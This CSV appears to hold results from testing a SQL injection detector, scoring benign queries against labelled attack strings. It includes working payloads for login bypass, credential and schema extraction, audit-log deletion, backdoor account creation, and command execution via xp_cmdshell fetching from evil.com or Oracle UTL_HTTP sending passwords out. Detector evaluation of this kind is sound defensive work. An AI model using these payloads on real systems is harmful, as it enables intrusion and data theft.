query,label,category,description,predicted,correct,malicious_probability
SELECT * FROM orders WHERE status != 'cancelled' AND total > 100;,0,multi_condition,Not cancelled,0,True,0.2986994792951625
SELECT * FROM users WHERE age >= 18 AND age <= 65 AND country = 'US';,0,multi_condition,Age range US,1,False,0.5196542909257285
"SELECT u.*, p.* FROM users u INNER JOIN profiles p ON u.id = p.user_id;",0,join,Inner join,1,False,0.8940834847067142
"SELECT o.*, u.email FROM orders o RIGHT JOIN users u ON o.user_id = u.id;",0,join,Right join,0,True,0.4526426698265479
"SELECT p.name, c.name AS category FROM products p JOIN categories c ON p.category_id = c.id;",0,join,Named join,0,True,0.3347771659371993
SELECT * FROM orders o JOIN order_items oi ON o.id = oi.order_id JOIN products p ON oi.product_id = p.id;,0,join,Triple join,1,False,0.5338409725716768
"SELECT u.name, COUNT(o.id) as order_count, SUM(o.total) as total_spent FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.id, u.name;",0,group_by,Customer summary,1,False,0.7207696827534161
"SELECT DATE(created_at) as date, COUNT(*) as orders FROM orders GROUP BY DATE(created_at);",0,group_by,Daily orders,0,True,0.12510440485285346
"SELECT category_id, COUNT(*), AVG(price), MAX(price) FROM products GROUP BY category_id HAVING COUNT(*) > 10;",0,group_by,Category stats,0,True,0.23250479965782622
"SELECT YEAR(created_at), MONTH(created_at), SUM(total) FROM orders GROUP BY YEAR(created_at), MONTH(created_at);",0,group_by,Monthly revenue,0,True,0.3609528372092372
SELECT * FROM products WHERE description LIKE '%wireless%';,0,like,Description search,0,True,0.04357701091670892
SELECT * FROM users WHERE email LIKE '%@company.com';,0,like,Company emails,0,True,0.3326493228706362
SELECT * FROM products WHERE name LIKE 'Samsung%' OR name LIKE 'Apple%';,0,like,Brand search,1,False,0.8611496019986311
SELECT * FROM logs WHERE message LIKE '%error%' OR message LIKE '%warning%';,0,like,Log search,1,False,0.8543756201545772
"INSERT INTO products (name, price, stock) VALUES ('New Product', 29.99, 100);",0,insert,Product insert,0,True,0.21881906750836122
"INSERT INTO users (email, password_hash, created_at) VALUES ('new@example.com', 'hash123', NOW());",0,insert,User registration,1,False,0.9645055818623826
"INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (100, 50, 2, 19.99);",0,insert,Order item,0,True,0.02682437902940527
"INSERT INTO logs (level, message, created_at) VALUES ('INFO', 'User logged in', NOW());",0,insert,Log entry,0,True,0.4661827858225509
UPDATE products SET stock = stock - 1 WHERE id = 42;,0,update,Decrement stock,0,True,0.18023283550780347
UPDATE users SET last_login = NOW() WHERE id = 5;,0,update,Login timestamp,0,True,0.16274971921236708
"UPDATE orders SET status = 'processing', updated_at = NOW() WHERE id = 100;",0,update,Order status,0,True,0.005797862129163897
UPDATE products SET price = price * 0.9 WHERE category_id = 5;,0,update,Category discount,0,True,0.002167425667659387
"DELETE FROM sessions WHERE created_at < DATE_SUB(NOW(), INTERVAL 30 DAY);",0,delete,Old sessions,1,False,0.5213542554474987
DELETE FROM cart_items WHERE user_id = 42 AND product_id = 100;,0,delete,Remove from cart,0,True,0.015241726836758613
"DELETE FROM notifications WHERE read_at IS NOT NULL AND created_at < DATE_SUB(NOW(), INTERVAL 90 DAY);",0,delete,Old notifications,1,False,0.9107493604610595
SELECT CURRENT_TIMESTAMP;,0,minimal,Current timestamp,1,False,0.9431754627988113
SELECT CURDATE();,0,minimal,Current date,1,False,0.8243660495561992
SELECT USER();,0,minimal,Current user,1,False,0.9574043135962915
SELECT @@sql_mode;,0,minimal,SQL mode,1,False,0.9619649532865158
SELECT CONNECTION_ID();,0,minimal,Connection ID,1,False,0.9955893328525052
SELECT LAST_INSERT_ID();,0,minimal,Last insert ID,1,False,0.9688057664433706
SELECT UUID();,0,minimal,Generate UUID,1,False,0.9587109680154264
SELECT * FROM products WHERE name = 'TRUNCATE Your Collection';,0,edge_case,Product name contains TRUNCATE,0,True,0.19270695121071135
SELECT * FROM products WHERE name = 'DELETE Me Not Flowers';,0,edge_case,Product name contains DELETE,0,True,0.06037882088003556
SELECT * FROM products WHERE name = 'INSERT Coin Arcade';,0,edge_case,Product name contains INSERT,0,True,0.05985453995155769
SELECT * FROM products WHERE name = 'UPDATE Your Wardrobe';,0,edge_case,Product name contains UPDATE,0,True,0.008471968461917577
SELECT * FROM products WHERE name = 'ALTER Ego Perfume';,0,edge_case,Product name contains ALTER,0,True,0.12896736747834256
SELECT * FROM products WHERE name = 'EXEC-utive Chair';,0,edge_case,Product name contains EXEC,0,True,0.03415861356278674
SELECT * FROM products WHERE name = '1=1 Equals One T-Shirt';,0,edge_case,Product contains 1=1,1,False,0.8843209213568386
SELECT * FROM products WHERE name = 'NULL and Void Game';,0,edge_case,Product contains NULL,0,True,0.3060035434840933
SELECT * FROM products WHERE sku = 'DROP-SHIP-001';,0,edge_case,SKU contains DROP,0,True,0.32909940576506047
SELECT * FROM products WHERE sku = 'SLEEP-WELL-002';,0,edge_case,SKU contains SLEEP,0,True,0.456714680283988
SELECT * FROM users WHERE username = 'admin123';,0,edge_case,Valid admin username,1,False,0.99873391280508
SELECT * FROM users WHERE username = 'test_user';,0,edge_case,Test username,0,True,0.4016233823635556
SELECT * FROM products WHERE description = 'Best seller -- highly recommended!';,0,edge_case,Double dash in description,1,False,0.8574630805419925
SELECT * FROM reviews WHERE comment = 'Works great; love it!';,0,edge_case,Semicolon in comment,1,False,0.9691464791784226
"SELECT * FROM products WHERE notes = 'Available in sizes S, M, L -- order now!';",0,edge_case,Double dash in notes,1,False,0.5750888183299542
SELECT * FROM users WHERE bio = 'Developer @ Tech Corp; Python enthusiast';,0,edge_case,Special chars in bio,1,False,0.6882581265145232
SELECT * FROM products WHERE tags LIKE '%or%';,0,edge_case,Tags with or,0,True,0.02284682091794643
SELECT * FROM products WHERE keywords LIKE '%and%';,0,edge_case,Keywords with and,0,True,0.06556934802065231
SELECT * FROM users WHERE password_hint = 'My pet''s name + birth year';,0,edge_case,Escaped quote in hint,1,False,0.7704882783077664
SELECT * FROM contacts WHERE company = 'O''Reilly Media';,0,edge_case,Company with apostrophe,0,True,0.2837177760401379
SELECT * FROM users WHERE name = 'D''Angelo';,0,edge_case,Name with apostrophe,0,True,0.1516882351010661
SELECT * FROM addresses WHERE street = '123 O''Connor Street';,0,edge_case,Street with apostrophe,1,False,0.5788622674750461
SELECT * FROM products WHERE id > 0 AND price > 0;,0,edge_case,Double positive conditions,0,True,0.013779827496828746
SELECT * FROM users WHERE id = id;,0,edge_case,Self equality,0,True,0.010284545830393161
"SELECT id, id FROM users LIMIT 5;",0,edge_case,Duplicate column,0,True,0.0026205558797336506
"SELECT 1+1, 2+2, 3+3;",0,edge_case,Math expressions,1,False,0.7826298501191787
"SELECT 'hello', 'world';",0,edge_case,String literals,1,False,0.9703321726935769
SELECT NULL IS NULL;,0,edge_case,Null check expression,1,False,0.9998463285414039
"SELECT TRUE, FALSE;",0,edge_case,Boolean literals,1,False,0.8689912479179738
SELECT * FROM (SELECT * FROM users WHERE id < 10) AS subq;,0,subquery,Derived table,0,True,0.4553184000354217
SELECT * FROM users WHERE salary > (SELECT AVG(salary) FROM users);,0,subquery,Comparison subquery,1,False,0.570625147349151
SELECT * FROM products WHERE EXISTS (SELECT 1 FROM inventory WHERE inventory.product_id = products.id AND quantity > 0);,0,subquery,EXISTS subquery,0,True,0.33845199189601877
"SELECT (SELECT name FROM categories WHERE id = p.category_id) as cat_name, p.name FROM products p;",0,subquery,Scalar subquery,0,True,0.019819745724845045
SELECT * FROM users WHERE id = (SELECT MAX(id) FROM users);,0,subquery,Max ID subquery,1,False,0.6952268962204339
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE vip = 1);,0,subquery,VIP customers,0,True,0.019491955233346073
1' OR '1'='1' --,1,tautology,Space before comment,1,True,0.999999999999998
' OR '1'='1' /*,1,tautology,Block comment end,1,True,0.9999999999999958
') OR ('x'='x,1,tautology,Parenthesis string,1,True,0.9999999893954935
0' OR '0'='0,1,tautology,Zero tautology,1,True,0.9999999997714111
' OR 2>1--,1,tautology,Greater than tautology,1,True,0.9999999999968945
' OR 1<2--,1,tautology,Less than tautology,1,True,0.9999999999999134
' OR 1!=2--,1,tautology,Not equal tautology,1,True,0.9999999999769222
' OR NOT 1=2--,1,tautology,NOT tautology,1,True,0.9999999968057349
' OR true--,1,tautology,Boolean true,1,True,0.9999998175796061
' OR 1--,1,tautology,Simple true,1,True,0.9999999999998868
admin' OR '1'='1,1,tautology,Admin bypass,1,True,1.0
administrator'--,1,tautology,Administrator bypass,1,True,0.999999998557668
root'--,1,tautology,Root bypass,1,True,0.9999923570132383
' OR ''=',1,tautology,Empty equality,1,True,0.9999999999994182
' OR 'abc'='abc,1,tautology,String equality,1,True,0.9999999974188114
"' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",1,union,Ten column UNION,1,True,0.9999999913171475
"' UNION SELECT null,null,null,null,null,null,null,null--",1,union,Eight nulls,1,True,0.9999999394769147
"' UNION SELECT id,username,password,email,null,null FROM users--",1,union,User data extraction,1,True,0.9999995652987921
' UNION SELECT * FROM mysql.user--,1,union,MySQL users,1,True,0.9999997635940302
' UNION SELECT * FROM pg_shadow--,1,union,PostgreSQL passwords,1,True,0.999999840029967
' UNION SELECT * FROM all_users--,1,union,Oracle users,1,True,0.9999999927764414
' UNION SELECT * FROM sys.syslogins--,1,union,MSSQL logins,1,True,0.9999986373224093
"' UNION SELECT table_name,column_name,data_type,null FROM information_schema.columns--",1,union,Column enumeration,1,True,0.999987045793194
"' UNION SELECT schema_name,null,null,null FROM information_schema.schemata--",1,union,Schema enumeration,1,True,0.9999859778896819
"' UNION SELECT grantee,privilege_type,null,null FROM information_schema.user_privileges--",1,union,Privilege enumeration,1,True,0.9999490078819547
"' UNION SELECT host,user,password FROM mysql.user--",1,union,MySQL credentials,1,True,0.9999986466787886
"' UNION SELECT name,sql,null,null FROM sqlite_master--",1,union,SQLite schema,1,True,0.9999967605734247
"' UNION SELECT @@hostname,@@version,user(),database()--",1,union,Server info,1,True,0.9999999609735144
"' UNION SELECT LOAD_FILE('/etc/passwd'),null,null,null--",1,union,File read UNION,1,True,0.9999999645850618
"'; INSERT INTO users (username,password,role) VALUES ('evil','password','admin')--",1,stacked,Create admin,1,True,0.999999657909737
'; UPDATE users SET is_admin = 1 WHERE username = 'attacker'--,1,stacked,Grant admin,1,True,0.9999742560235954
'; DELETE FROM audit_log--,1,stacked,Delete audit,1,True,0.9998477314733172
'; DROP INDEX idx_users_email--,1,stacked,Drop index,1,True,0.9999952024852408
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password'--,1,stacked,Grant privileges,1,True,0.9999998061688269
'; REVOKE ALL PRIVILEGES ON *.* FROM 'legit_user'@'localhost'--,1,stacked,Revoke privileges,1,True,0.9997191445759983
'; CREATE USER 'backdoor' IDENTIFIED BY 'secret'--,1,stacked,Create user,1,True,0.9999954143689378
'; ALTER USER 'admin' IDENTIFIED BY 'hacked123'--,1,stacked,Change password,1,True,0.9999999999732745
'; RENAME TABLE users TO users_backup--,1,stacked,Rename table,1,True,0.9999978669269224
'; TRUNCATE audit_logs--,1,stacked,Truncate audit,1,True,0.999992103269884
"1; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--",1,stacked,MSSQL sysadmin,1,True,0.9999999951490184
"'; EXEC sp_configure 'xp_cmdshell', 1--",1,stacked,Enable cmdshell,1,True,0.9999947722891905
' AND SLEEP(15)--,1,time_blind,15 second sleep,1,True,0.9999999876388616
' AND SLEEP(30)--,1,time_blind,30 second sleep,1,True,0.9999999913372605
"' AND IF(1=1,SLEEP(10),0)--",1,time_blind,Conditional 10s,1,True,0.9999997472588068
"' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(10),0)--",1,time_blind,Version check sleep,1,True,0.9999998658517768
' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--,1,time_blind,User check sleep,1,True,0.9999999996208793
"' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",1,time_blind,Table exists sleep,1,True,0.9999990797121971
"' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--",1,time_blind,Password extraction,1,True,0.9999989746325939
"' OR IF(1=1,BENCHMARK(50000000,MD5('test')),0)--",1,time_blind,High benchmark,1,True,0.9999981499380238
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--,1,time_blind,PostgreSQL CASE sleep,1,True,0.999992119228274
"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)--",1,time_blind,Oracle time delay,1,True,0.9999991249226899
' AND 1=1 AND 'a'='a,1,boolean_blind,Double AND true,1,True,0.9999999999717453
' AND 1=2 AND 'a'='a,1,boolean_blind,AND false,1,True,0.9999999995811104
' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--,1,boolean_blind,Length check,1,True,0.9998034595219181
"' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",1,boolean_blind,First char check,1,True,0.9999971325495427
' AND (SELECT COUNT(*) FROM information_schema.tables)>10--,1,boolean_blind,Table count,1,True,0.9999529849467998
' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users'--,1,boolean_blind,Table name check,1,True,0.9999020848877053
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='id'--,1,boolean_blind,Column check,1,True,0.9999177720827971
' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')>5--,1,boolean_blind,Column count,1,True,0.9999030467535674
"' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 0,1),1,1))>64--",1,boolean_blind,Complex extraction,1,True,0.9999707889509344
' AND (SELECT 1)=1--,1,boolean_blind,Simple subquery true,1,True,0.9999999759419141
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",1,error_based,Database name error,1,True,0.9999978727755097
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",1,error_based,User name error,1,True,0.9999949279491609
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",1,error_based,Table name error,1,True,0.9999718791348261
"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--",1,error_based,Password error,1,True,0.9999781295646194
"' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--",1,error_based,Complex error,1,True,0.9999997874162095
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,Group by error,1,True,0.9999878431920772
' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--,1,error_based,Geometry error,1,True,0.9999967793389039
' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--,1,error_based,Polygon error,1,True,0.9999162476802748
' AND LINESTRING((SELECT * FROM(SELECT * FROM(SELECT database())a)b))--,1,error_based,Linestring error,1,True,0.9999769052361622
' OR 1+1=2--,1,obfuscated_case,Math expression,1,True,0.9999999999699047
'oR'1'='1,1,obfuscated_case,No spaces OR,1,True,0.999999999655224
'AnD 1=0 oR 1=1--,1,obfuscated_case,Mixed AND OR,1,True,0.9999999999650659
' union select null--,1,obfuscated_case,Lowercase union,1,True,0.9904119799493752
' UNION select null--,1,obfuscated_case,Mixed case union,1,True,0.9999994678135072
' UnIoN aLl SeLeCt NuLl--,1,obfuscated_case,Alternating UNION ALL,1,True,0.9999885003863811
'/**/oR/**/1=1--,1,obfuscated_comment,Comment OR lowercase,1,True,0.9999999999997329
"'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",1,obfuscated_comment,Comment UNION ALL,1,True,0.9999999999210667
'/*!00000OR*/1=1--,1,obfuscated_comment,MySQL conditional,1,True,0.9999999427044912
"'/*!12345UNION*//*!12345SELECT*/1,2,3--",1,obfuscated_comment,MySQL version UNION,1,True,0.9999989929392624
'/**_**/OR/**_**/1=1--,1,obfuscated_comment,Underscore comments,1,True,0.9999999999996363
'+OR+'1'='1,1,obfuscated_concat,Plus concat,1,True,0.9999999998836067
'||'1'='1,1,obfuscated_concat,Oracle concat OR,1,True,0.9999999894979638
' OR CHAR(49)=CHAR(49)--,1,obfuscated_concat,CHAR comparison,1,True,0.9999783290169528
' OR 0x313d31--,1,obfuscated_encoded,Hex comparison,1,True,0.9999999343162195
' OR UNHEX('3d')=UNHEX('3d')--,1,obfuscated_encoded,UNHEX comparison,1,True,0.9999999889544918
'%20OR%20'1'='1,1,obfuscated_encoded,URL space encoding,1,True,0.9999998568534741
'%09OR%091=1--,1,obfuscated_encoded,URL tab encoding,1,True,0.9999999973428515
'%0aOR%0a1=1--,1,obfuscated_encoded,URL newline encoding,1,True,0.999999999764714
'%00' OR '1'='1,1,obfuscated_encoded,Null byte injection,1,True,0.9999999999999261
' unicode OR 1=1--,1,obfuscated_encoded,Unicode prefix,1,True,0.9999999999988392
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --',1,full_injection_select,Full login bypass,1,True,0.9999999999994815
"SELECT * FROM products WHERE id = -1 UNION SELECT 1,username,password,4 FROM users--",1,full_injection_select,Full data extraction,1,True,0.9999912629643644
"SELECT * FROM users WHERE email = 'x' UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables--",1,full_injection_select,Full schema extraction,1,True,0.9999969106626557
SELECT * FROM orders WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE is_admin=1) > 0--,1,full_injection_select,Full boolean check,1,True,0.997873149679611
SELECT * FROM products WHERE id = '1' AND SLEEP(5) AND '1'='1,1,full_injection_select,Full time-based,1,True,0.9999999813397008
"INSERT INTO comments (user_id, text) VALUES (1, 'test'); DELETE FROM users; --');",1,full_injection_insert,Insert with delete,1,True,0.9999407795951178
"INSERT INTO feedback (message) VALUES ('x'),(SELECT password FROM users)--');",1,full_injection_insert,Insert subquery,1,True,0.9999481196335488
UPDATE users SET email = 'x@x.com' WHERE id = 1 OR 1=1--,1,full_injection_update,Update all users,1,True,0.9999999229319173
UPDATE products SET price = 0 WHERE id = 1; DROP TABLE products--,1,full_injection_update,Update drop,1,True,0.9981486652973622
DELETE FROM products WHERE id = 1 OR id = id--,1,full_injection_delete,Delete all,1,True,0.9853249643557308
DELETE FROM orders WHERE 1=1; INSERT INTO users (admin) VALUES (1)--,1,full_injection_delete,Delete insert,1,True,0.9999978131489792
"' UNION SELECT name,sql FROM sqlite_master--",1,advanced,SQLite schema dump,1,True,0.9999987726782111
"' UNION SELECT group_concat(tbl_name),1 FROM sqlite_master WHERE type='table'--",1,advanced,SQLite tables,1,True,0.9999857617575677
' OR 1=1; ATTACH DATABASE '/tmp/evil.db' AS evil--,1,advanced,SQLite attach,1,True,0.9999999991710267
'; COPY (SELECT '') TO PROGRAM 'whoami'--,1,advanced,PostgreSQL command,1,True,0.9999993271883315
'; CREATE OR REPLACE FUNCTION shell(text) RETURNS text AS 'system($1)' LANGUAGE plperlu--,1,advanced,PostgreSQL function shell,1,True,0.9999533215332199
'; DO $$DECLARE r RECORD;BEGIN EXECUTE 'COPY (SELECT 1) TO PROGRAM ''id''';END$$--,1,advanced,PostgreSQL DO block,1,True,0.9999980735361795
"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",1,advanced,MSSQL convert error,1,True,0.9999930574857373
'; EXEC master..xp_cmdshell 'powershell -c IEX(wget http://evil.com/shell.ps1)'--,1,advanced,MSSQL powershell,1,True,0.9999591618397317
'; EXEC master..xp_fileexist 'C:\Windows\win.ini'--,1,advanced,MSSQL file check,1,True,0.9999583764422367
"'; SELECT * FROM OPENROWSET('SQLOLEDB','server=evil.com;uid=sa;pwd=password','SELECT 1')--",1,advanced,MSSQL OPENROWSET,1,True,0.9999860102760624
' OR UTL_HTTP.request('http://evil.com/'||(SELECT password FROM users WHERE rownum=1))--,1,advanced,Oracle out-of-band,1,True,0.9999933169258428
' AND DBMS_XMLQUERY.NEWCONTEXT('SELECT * FROM users')--,1,advanced,Oracle XML injection,1,True,0.9999531856035401
"' UNION SELECT XMLType('<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://evil.com/""> %xxe;]><foo></foo>') FROM dual--",1,advanced,Oracle XXE,1,True,0.9999965373541877
' AND '1'='1&password=anything,1,advanced,Parameter pollution,1,True,0.9999999994888398
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(@@secure_file_priv)))--",1,advanced,Check file privs,1,True,0.9999862930884745
' UNION SELECT TO_BASE64(LOAD_FILE('/etc/passwd'))--,1,advanced,Base64 file read,1,True,0.9999999904865348
SELECT * FROM products WHERE {{user_input}};,0,placeholder,Template placeholder,0,True,0.0012132769867707074
SELECT * FROM users WHERE role = %(role)s;,0,placeholder,Python format placeholder,0,True,0.0027756017593733675
SELECT * FROM orders WHERE id = {0};,0,placeholder,C# format placeholder,0,True,0.0007979710997155226
SELECT * FROM products WHERE id = @product_id;,0,placeholder,MSSQL parameter,0,True,0.0012923803827267753
SELECT * FROM users WHERE id = $1;,0,placeholder,PostgreSQL parameter,0,True,0.008461896542707391
SELECT * FROM users WHERE email = :email AND status = :status;,0,placeholder,Multiple named params,0,True,0.003343679757786946
SELECT * FROM products WHERE price BETWEEN :min_price AND :max_price;,0,placeholder,Range params,0,True,0.006665855442806076
"SELECT * FROM users WHERE TIMESTAMPDIFF(YEAR, birthday, CURDATE()) >= 18;",0,complex_benign,Age calculation,0,True,0.3507063933958565
SELECT * FROM products WHERE (price - discount_amount) * (1 + tax_rate) < 100;,0,complex_benign,Complex expression,0,True,0.00821984153058763
"SELECT IFNULL(nickname, CONCAT(first_name, ' ', last_name)) AS display_name FROM users;",0,complex_benign,IFNULL concat,1,False,0.890191824451112
"SELECT *, CASE WHEN stock > 10 THEN 'In Stock' WHEN stock > 0 THEN 'Low Stock' ELSE 'Out of Stock' END AS availability FROM products;",0,complex_benign,Multi-case expression,1,False,0.8363641338083585
"SELECT * FROM users WHERE email RLIKE '^[a-z]+@[a-z]+\\.[a-z]{2,}$';",0,complex_benign,RLIKE pattern,0,True,0.13681741781717938
SELECT INET_ATON('192.168.1.1');,0,complex_benign,IP function,1,False,0.9920573673018268
SELECT HEX('hello');,0,complex_benign,HEX function,1,False,0.9787704833925946
SELECT MD5('password');,0,complex_benign,MD5 function,1,False,0.9966402903654563
"SELECT SHA2('data', 256);",0,complex_benign,SHA function,1,False,0.9896814177524694
"SELECT JSON_EXTRACT(data, '$.user.name') FROM orders;",0,complex_benign,JSON extract,1,False,0.6916107136907894
"SELECT * FROM users WHERE JSON_CONTAINS(permissions, '\admin\""');""",0,complex_benign,JSON contains,1,False,0.9995669553747338
WITH RECURSIVE category_tree AS (SELECT * FROM categories WHERE parent_id IS NULL UNION ALL SELECT c.* FROM categories c JOIN category_tree ct ON c.parent_id = ct.id) SELECT * FROM category_tree;,0,complex_benign,Recursive CTE,1,False,0.9800288544001063
"SELECT *, ROW_NUMBER() OVER (PARTITION BY category_id ORDER BY price DESC) as rank FROM products;",0,complex_benign,Window function,1,False,0.67121408948147
"SELECT *, LAG(price) OVER (ORDER BY created_at) as prev_price FROM products;",0,complex_benign,LAG function,0,True,0.0397465597432772
"SELECT *, SUM(total) OVER (ORDER BY created_at ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) as running_total FROM orders;",0,complex_benign,Running total,1,False,0.6559291320181819
SELECT * FROM products WHERE SOUNDEX(name) = SOUNDEX('phone');,0,complex_benign,SOUNDEX search,0,True,0.15396951360503702
SELECT * FROM users WHERE MATCH(bio) AGAINST('developer programmer' IN NATURAL LANGUAGE MODE);,0,complex_benign,Full text natural,1,False,0.9335036605375061
SELECT * FROM products FORCE INDEX (idx_category) WHERE category_id = 5;,0,complex_benign,Force index,0,True,0.007374209494331004
SELECT /*+ INDEX(users idx_email) */ * FROM users WHERE email = 'test@example.com';,0,complex_benign,Index hint,1,False,0.9285742102886693
LOCK TABLES users WRITE;,0,complex_benign,Lock table,1,False,0.9998925541582958
START TRANSACTION;,0,complex_benign,Start transaction,1,False,0.9992610640414121
COMMIT;,0,complex_benign,Commit,1,False,0.8764178444772395
ROLLBACK;,0,complex_benign,Rollback,1,False,0.9862110671552222
SET autocommit = 0;,0,complex_benign,Disable autocommit,1,False,0.9576887473571191
SET NAMES 'utf8mb4';,0,complex_benign,Set charset,1,False,0.9828335714654913
SET @var = 5;,0,complex_benign,Set variable,0,True,0.4192981811368408
SELECT @var;,0,complex_benign,Select variable,1,False,0.9124971019119128
PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?';,0,complex_benign,Prepare statement,0,True,0.050531693659154456
EXECUTE stmt USING @user_id;,0,complex_benign,Execute prepared,1,False,0.9785593959139162
DEALLOCATE PREPARE stmt;,0,complex_benign,Deallocate prepared,1,False,0.9965097593106418
ANALYZE TABLE users;,0,complex_benign,Analyze table,1,False,0.99980016341003
OPTIMIZE TABLE products;,0,complex_benign,Optimize table,1,False,0.9974910784734099
CHECK TABLE orders;,0,complex_benign,Check table,1,False,0.9990929202542984
REPAIR TABLE sessions;,0,complex_benign,Repair table,1,False,0.9990301406600329
FLUSH PRIVILEGES;,0,complex_benign,Flush privileges,1,False,0.9954237241501845
SHOW PROCESSLIST;,0,complex_benign,Show processes,1,False,0.9984162958580148
SHOW VARIABLES LIKE 'max_connections';,0,complex_benign,Show variable,1,False,0.9894984866113443
SHOW STATUS LIKE 'Threads%';,0,complex_benign,Show status,1,False,0.9953719406527333
SHOW INDEX FROM users;,0,complex_benign,Show indexes,1,False,0.6513259863530327
SHOW GRANTS FOR CURRENT_USER;,0,complex_benign,Show grants,1,False,0.9997618673430743
